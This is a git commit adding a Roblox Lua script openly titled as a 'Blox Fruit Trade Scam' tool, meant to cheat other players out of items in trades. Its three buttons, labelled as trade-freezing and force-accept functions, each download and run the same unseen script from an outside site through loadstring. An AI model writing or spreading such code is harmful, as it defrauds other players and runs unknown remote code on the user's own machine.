5e51ca463f2507217af3c21d898a2e8352db373a
Dekmiss59 <missyouking555@gmail.com>
2024-12-25 20:54:19 +0700

    Create BloxFruitTrade2.0.lua

---
+++ BloxFruitTrade2.0.lua
@@ -0,0 +1,55 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Blox Fruit Trade Scam | Private 2.0 script", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+    Name = "BloxFruit",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+    Name = "Blox Fruit TRADE SCAM OP"
+}) 
+
+
+OrionLib:MakeNotification({
+    Name = "Missyou Hub",
+    Content = "missyou hub",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+
+Tab:AddButton({
+    Name = "Freeze Trade",
+    Callback = function()
+        loadstring(game:HttpGet('https://darkscripts.space/scripts/8f9b92a4-60cd-4709-a63f-e940585868c6_1182991105411780646.lua',true))()
+         end
+})
+
+Tab:AddButton({
+    Name = "Force Accept",
+    Callback = function()
+        loadstring(game:HttpGet('https://darkscripts.space/scripts/8f9b92a4-60cd-4709-a63f-e940585868c6_1182991105411780646.lua',true))()
+         end
+})
+
+Tab:AddButton({
+    Name = "Freeze Player (Anti Jump Victim)",
+    Callback = function()
+        loadstring(game:HttpGet('https://darkscripts.space/scripts/8f9b92a4-60cd-4709-a63f-e940585868c6_1182991105411780646.lua',true))()
+         end
+})
+
+local CreditTab = Window:MakeTab({
+    Name = "Credit",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+CreditTab:AddParagraph("DEKMISSYOU")
+
+OrionLib:Init()
+
+CreditTab:AddParagraph("https://discord.gg/r77t6KvNXQ")
+
+OrionLib:Init()
